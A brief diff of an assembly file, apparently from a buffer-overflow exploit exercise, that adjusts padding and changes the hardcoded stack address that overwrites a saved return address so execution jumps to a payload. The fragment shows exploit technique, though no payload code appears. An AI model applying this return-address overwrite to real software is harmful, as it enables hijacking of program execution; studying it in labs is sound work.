@@ -40,4 +40,4 @@ main:
         .ascii  "eeee"
         .ascii  "ff"
         // .ascii  "gggg"
-        .quad   0x7fffffffded0           /* buffer ptr (the first instruction of payload), will overwrite real return address */
+        .quad   0x7fffffffdf40           /* buffer ptr (the first instruction of payload), will overwrite real return address */
